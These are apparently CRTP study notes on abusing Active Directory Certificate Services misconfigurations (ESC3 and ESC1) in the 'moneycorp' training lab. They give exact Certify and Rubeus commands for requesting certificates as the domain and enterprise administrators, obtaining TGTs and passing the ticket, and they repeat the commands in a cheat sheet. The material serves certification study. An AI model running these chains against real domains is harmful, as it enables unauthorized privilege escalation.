# Across Domain Trusts – AD CS Abuse

## Overview

**Active Directory Certificate Services (AD CS)** enables a Public Key Infrastructure (PKI) within an Active Directory environment.

AD CS provides certificates that can be used for:

* User and machine authentication
* Encryption
* Digital signatures
* Smart Card Logon
* Other PKI-based authentication mechanisms

In an Active Directory environment, incorrectly configured certificate authorities, certificate templates, enrollment permissions, and certificate usages can create privilege-escalation paths.

This section focuses on abusing AD CS **across domain trusts**, specifically the lab's **ESC3** and **ESC1** scenarios.

---

# 1. AD CS Components

## Certification Authority (CA)

The **Certification Authority** is responsible for issuing certificates.

The CA can be installed on a Domain Controller or on a separate server.

Example:

```text
moneycorp-MCORP-DC-CA
```

---

## Certificate

A certificate is issued to a user or machine and can be used for:

* Authentication
* Encryption
* Signing

In this lab, certificates are ultimately used for **Kerberos authentication**.

---

## Certificate Signing Request (CSR)

A **Certificate Signing Request (CSR)** is created by a client when requesting a certificate from the CA.

Conceptually:

```text
Client
  │
  │ Certificate Request
  ▼
Certificate Authority
  │
  ▼
Certificate
```

---

## Certificate Template

A certificate template defines how a certificate can be issued.

It can specify:

* Enrollment permissions
* Extended Key Usages
* Validity/expiry
* Application policies
* Other certificate properties

Certificate templates are particularly important when identifying AD CS misconfigurations.

---

## EKU – Extended Key Usage

**Extended Key Usage (EKU)** specifies how a certificate can be used.

Examples include:

```text
Client Authentication
Smart Card Logon
Certificate Request Agent
SubCA
```

The EKU becomes particularly important when determining whether a certificate can be used for authentication or certificate-request delegation.

---

# 2. Why AD CS Is Important for Security

AD CS can potentially be abused for:

* Extracting user and machine certificates
* Using certificates to retrieve NTLM hashes
* User-level persistence
* Machine-level persistence
* Escalation to Domain Admin
* Escalation to Enterprise Admin
* Domain persistence

The CRTP material focuses only on selected techniques rather than every possible AD CS abuse technique.

---

# 3. Enumerating AD CS

The **Certify** tool can be used to enumerate AD CS in the target forest.

Repository:

```text
https://github.com/GhostPack/Certify
```

## Enumerate Certification Authorities

### 🔴 Command

```cmd
Certify.exe cas
```

### Purpose

Enumerates the available Certification Authorities.

---

# 4. Enumerate Certificate Templates

### 🔴 Command

```cmd
Certify.exe find
```

### Purpose

Enumerates certificate templates and their configuration.

This allows us to understand:

```text
CA
 │
 ├── Template A
 ├── Template B
 ├── Template C
 └── ...
```

---

# 5. Find Vulnerable Templates

### 🔴 Command

```cmd
Certify.exe find /vulnerable
```

### Purpose

Searches for certificate templates that Certify identifies as potentially vulnerable.

This is one of the most useful commands during the initial AD CS enumeration phase.

---

# 6. Common Misconfigurations in the Lab

The `moneycorp` environment contains multiple AD CS misconfigurations.

The supplied material identifies the following common requirements for the ESC1 and ESC3 escalation paths:

### CA Configuration

The CA:

* Grants normal/low-privileged users enrollment rights.
* Has Manager Approval disabled.
* Does not require authorization signatures.

### Template Configuration

The target certificate template:

* Grants normal/low-privileged users enrollment rights.

Conceptually:

```text
Low-Privilege User
        │
        ▼
Certificate Enrollment
        │
        ▼
Misconfigured Template
        │
        ▼
Certificate
        │
        ▼
Kerberos Authentication
        │
        ▼
Privileged Account
```

---

# 7. ESC3 – Certificate Request Agent

The first template discussed is:

```text
SmartCardEnrollment-Agent
```

This template:

* Allows Domain Users to enroll.
* Has the **Certificate Request Agent** EKU.

The second template is:

```text
SmartCardEnrollment-Users
```

This template:

* Has an Application Policy Issuance Requirement involving Certificate Request Agent.
* Has an EKU that allows domain authentication.

This creates the certificate-request delegation chain used in the lab.

---

# 8. ESC3 – Escalation to Domain Admin

## Step 1 – Request Certificate Request Agent Certificate

The first step is to request a certificate from:

```text
SmartCardEnrollment-Agent
```

### 🔴 Command

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

### Purpose

This requests a certificate that has the **Certificate Request Agent** capability.

Conceptually:

```text
Low-Privilege User
       │
       ▼
SmartCardEnrollment-Agent
       │
       ▼
Certificate Request Agent Certificate
```

The resulting certificate is represented in the lab material as `cert.pem`.

---

# 9. Convert Certificate to PFX

The supplied material states that the resulting `cert.pem` is converted into a `.pfx` file.

The lab refers to the resulting file as:

```text
esc3agent.pfx
```

A PFX file can contain the certificate together with its private key and can subsequently be used by tools such as Rubeus.

---

# 10. Request a Certificate on Behalf of Domain Admin

The Certificate Request Agent certificate can now be used with:

```text
SmartCardEnrollment-Users
```

to request a certificate on behalf of the Domain Admin account.

### 🔴 Command

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

### Important Parameters

| Parameter       | Purpose                                                |
| --------------- | ------------------------------------------------------ |
| `/ca`           | Specifies the Certification Authority                  |
| `/template`     | Specifies the certificate template                     |
| `/onbehalfof`   | Requests the certificate on behalf of another identity |
| `/enrollcert`   | Supplies the enrollment certificate                    |
| `/enrollcertpw` | Password for the PFX                                   |

The resulting certificate represents the privileged identity.

---

# 11. Request Domain Admin TGT

The newly obtained certificate can then be used with Rubeus to request a Kerberos TGT.

### 🔴 Command

```cmd
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
```

### Purpose

The certificate is used for Kerberos authentication for the `administrator` account.

`/ptt` passes the resulting TGT into the current session.

Conceptually:

```text
Certificate Request Agent
          │
          ▼
Certificate for Administrator
          │
          ▼
Rubeus
          │
          ▼
Administrator TGT
          │
          ▼
Pass-the-Ticket
          │
          ▼
Domain Admin Access
```

---

# 12. ESC3 – Escalation to Enterprise Admin

The same Certificate Request Agent concept can be used to request a certificate on behalf of the Enterprise Admin identity.

## Step 1 – Request Certificate on Behalf of EA

### 🔴 Command

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

### Purpose

This requests a certificate on behalf of:

```text
moneycorp.local\administrator
```

The resulting certificate is represented in the material as:

```text
esc3user.pfx
```

---

# 13. Request Enterprise Admin TGT

### 🔴 Command

```cmd
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

### Purpose

The certificate is used to request a TGT for the Enterprise Admin identity and inject it into the current session.

Conceptually:

```text
Certificate Request Agent
          │
          ▼
Certificate for EA
          │
          ▼
Rubeus asktgt
          │
          ▼
EA TGT
          │
          ▼
/ptt
          │
          ▼
Enterprise Admin
```

---

# 14. ESC1 – Enrollee Supplies Subject

The material then introduces another AD CS misconfiguration.

The template:

```text
HTTPSCertificates
```

has:

```text
ENROLLEE_SUPPLIES_SUBJECT
```

configured for its `msPKI-Certificates-Name-Flag`.

This is important because it allows the certificate requester to specify the identity/subject information included in the certificate request.

---

# 15. Find Templates with Enrollee Supplies Subject

### 🔴 Command

```cmd
Certify.exe find /enrolleeSuppliesSubject
```

### Purpose

Searches for certificate templates configured with the **Enrollee Supplies Subject** property.

---

# 16. ESC1 – Request Certificate for Administrator

The material states that:

```text
HTTPSCertificates
```

allows enrollment to the:

```text
RDPUsers
```

group.

The lab then demonstrates requesting a certificate for a privileged identity while operating as the lower-privileged student account.

### 🔴 Command

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

### Purpose

The `/altname` parameter specifies the alternate identity for the certificate request.

In the supplied lab:

```text
/altname:administrator
```

is used.

Conceptually:

```text
Low-Privilege User
        │
        ▼
HTTPSCertificates
        │
        ▼
Certificate with privileged identity
        │
        ▼
Authentication as Administrator
```

---

# 17. Convert ESC1 Certificate to PFX

The resulting certificate is converted from:

```text
cert.pem
```

to:

```text
esc1.pfx
```

The PFX is then used for Kerberos authentication.

---

# 18. Request Domain Admin TGT – ESC1

### 🔴 Command

```cmd
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```

### Purpose

The certificate is used to request a TGT for the Administrator identity and inject it into the current session.

---

# 19. ESC3 Attack Chain

The complete ESC3 flow is:

```text
              AD CS
                │
                ▼
 SmartCardEnrollment-Agent
                │
                ▼
 Certificate Request Agent
                │
                ▼
     esc3agent.pfx
                │
                ▼
 SmartCardEnrollment-Users
                │
                ▼
 Certificate on behalf of
 privileged account
                │
        ┌───────┴────────┐
        ▼                ▼
 Domain Admin      Enterprise Admin
        │                │
        ▼                ▼
      TGT              TGT
        │                │
        └───────┬────────┘
                ▼
               /ptt
```

---

# 20. ESC1 Attack Chain

The ESC1 flow is:

```text
Low-Privilege User
       │
       ▼
HTTPSCertificates
       │
       ▼
Enrollee Supplies Subject
       │
       ▼
Specify privileged identity
       │
       ▼
Certificate
       │
       ▼
PFX
       │
       ▼
Rubeus asktgt
       │
       ▼
Administrator TGT
       │
       ▼
/ptt
       │
       ▼
Domain Admin / Enterprise Admin
```

---

# 21. Complete AD CS Methodology

The overall methodology from the supplied material can be remembered as:

```text
1. Enumerate CA
       ↓
2. Enumerate Templates
       ↓
3. Find Vulnerable Templates
       ↓
4. Identify Enrollment Permissions
       ↓
5. Examine EKUs / Application Policies
       ↓
6. Identify ESC1 / ESC3 Conditions
       ↓
7. Request Certificate
       ↓
8. Convert Certificate to PFX
       ↓
9. Use Certificate for Kerberos Authentication
       ↓
10. Request TGT
       ↓
11. Pass the Ticket
       ↓
12. Obtain Higher Privilege
```

---

# 22. Command Cheat Sheet

## Enumerate CAs

```cmd
Certify.exe cas
```

## Enumerate Templates

```cmd
Certify.exe find
```

## Find Vulnerable Templates

```cmd
Certify.exe find /vulnerable
```

## Find Enrollee-Supplies-Subject Templates

```cmd
Certify.exe find /enrolleeSuppliesSubject
```

## ESC3 – Request Certificate Request Agent

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

## ESC3 – Request Certificate on Behalf of DA

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

## ESC3 – Request DA TGT

```cmd
Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
```

## ESC3 – Request Certificate on Behalf of EA

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
```

## ESC3 – Request EA TGT

```cmd
Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
```

## ESC1 – Request Certificate

```cmd
Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```

## ESC1 – Request DA TGT

```cmd
Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
```

---

# 23. Important Terms

| Term                          | Meaning                                                                           |
| ----------------------------- | --------------------------------------------------------------------------------- |
| **AD CS**                     | Active Directory Certificate Services                                             |
| **PKI**                       | Public Key Infrastructure                                                         |
| **CA**                        | Certification Authority                                                           |
| **CSR**                       | Certificate Signing Request                                                       |
| **Certificate Template**      | Defines how certificates can be issued                                            |
| **EKU**                       | Extended Key Usage                                                                |
| **Certificate Request Agent** | Certificate capability used to request certificates on behalf of another identity |
| **PFX**                       | Certificate container containing certificate/private-key material                 |
| **ESC1**                      | AD CS misconfiguration involving requester-controlled subject information         |
| **ESC3**                      | AD CS misconfiguration involving Certificate Request Agent functionality          |
| **TGT**                       | Kerberos Ticket Granting Ticket                                                   |
| **PTT**                       | Pass-the-Ticket                                                                   |

---

# 24. CRTP Mental Model

Don't memorize all the Certify commands individually.

Remember the **reasoning chain**:

### ESC3

```text
Enrollment
    ↓
Certificate Request Agent
    ↓
Request certificate on behalf of another identity
    ↓
Privileged certificate
    ↓
Kerberos TGT
    ↓
Pass-the-Ticket
    ↓
Privileged access
```

### ESC1

```text
Enrollment
    ↓
Enrollee Supplies Subject
    ↓
Specify privileged identity
    ↓
Privileged certificate
    ↓
Kerberos TGT
    ↓
Pass-the-Ticket
    ↓
Privileged access
```

---

# 25. Revision Questions

Before moving forward, make sure you can answer:

1. What is AD CS?
2. What is the role of a CA?
3. What is a certificate template?
4. What does an EKU determine?
5. Why is certificate enrollment permission important?
6. What does `Certify.exe cas` enumerate?
7. What does `Certify.exe find /vulnerable` do?
8. What is the Certificate Request Agent?
9. What is the basic idea behind ESC3?
10. What is the significance of `SmartCardEnrollment-Agent`?
11. What is the significance of `SmartCardEnrollment-Users`?
12. What is `ENROLLEE_SUPPLIES_SUBJECT`?
13. Why is `HTTPSCertificates` interesting in the ESC1 scenario?
14. Why is the certificate converted to PFX?
15. What does `Rubeus asktgt` accomplish?
16. What does `/ptt` accomplish?
17. How does the ESC3 path lead from a low-privileged user toward DA?
18. How does the lab demonstrate escalation toward EA?
19. What is the difference between the ESC1 and ESC3 attack chains?

---

# 26. One-Line Memory Aids

### AD CS Enumeration

**CA → Templates → Vulnerabilities**

### ESC1

**Enrollment → Supply Subject → Privileged Certificate → TGT → PTT**

### ESC3

**Enrollment → Request Agent → Request on Behalf → Privileged Certificate → TGT → PTT**

### Overall

> **AD CS turns certificate-template misconfigurations into authentication and privilege-escalation paths.**
